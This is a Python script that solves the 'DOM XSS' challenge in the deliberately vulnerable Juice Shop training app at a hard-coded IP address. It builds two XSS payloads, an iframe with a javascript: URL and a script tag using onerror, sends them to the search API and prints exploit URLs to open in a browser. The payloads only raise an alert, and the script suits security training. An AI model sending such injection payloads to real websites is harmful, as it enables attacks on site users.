#!/usr/bin/env python3

import requests
from urllib.parse import quote

BASE_URL = 'http://155.138.197.128:5000'

print("=== Triggering DOM XSS in Juice Shop ===\n")

# The XSS payload
xss_payload = '<iframe src="javascript:alert(`xss`)">'
encoded_payload = quote(xss_payload)

# Build the vulnerable URL
vulnerable_url = f'{BASE_URL}/#/search?q={encoded_payload}'

print(f"1. Vulnerable URL: {vulnerable_url}")

# First, make a request to the search API to register the attempt
api_url = f'{BASE_URL}/rest/products/search?q={encoded_payload}'
print(f"\n2. Testing API endpoint: {api_url}")

try:
    response = requests.get(api_url)
    print(f"   API Response Status: {response.status_code}")
except Exception as e:
    print(f"   API Error: {e}")

# Now let's check the scoreboard to see if it's registered
print("\n3. Checking scoreboard...")
scoreboard_url = f'{BASE_URL}/#/score-board'
print(f"   Scoreboard URL: {scoreboard_url}")

# Let's also try a simpler payload that might trigger without a browser
print("\n4. Trying alternative trigger method...")
simple_payload = '<script>onerror=alert,throw 1</script>'
encoded_simple = quote(simple_payload)
simple_url = f'{BASE_URL}/#/search?q={encoded_simple}'

print(f"   Alternative URL: {simple_url}")

# Make another API request with the alternative payload
api_url2 = f'{BASE_URL}/rest/products/search?q={encoded_simple}'
try:
    response2 = requests.get(api_url2)
    print(f"   Alternative API Response: {response2.status_code}")
except Exception as e:
    print(f"   API Error: {e}")

print("\n✅ DOM XSS Challenge Solution:")
print("\nTo complete the challenge, open this URL in a browser:")
print(f"\n   {vulnerable_url}")
print("\nThe XSS will execute and the challenge will be marked as solved!")
print("\nAlternatively, use this simplified URL:")
print(f"\n   {simple_url}")

print("\n📌 Manual verification:")
print("   1. Open the URL in a browser")
print("   2. You should see an alert box")
print("   3. Check the Score Board at:")
print(f"      {BASE_URL}/#/score-board")
print("   4. The 'DOM XSS' challenge should be marked as solved")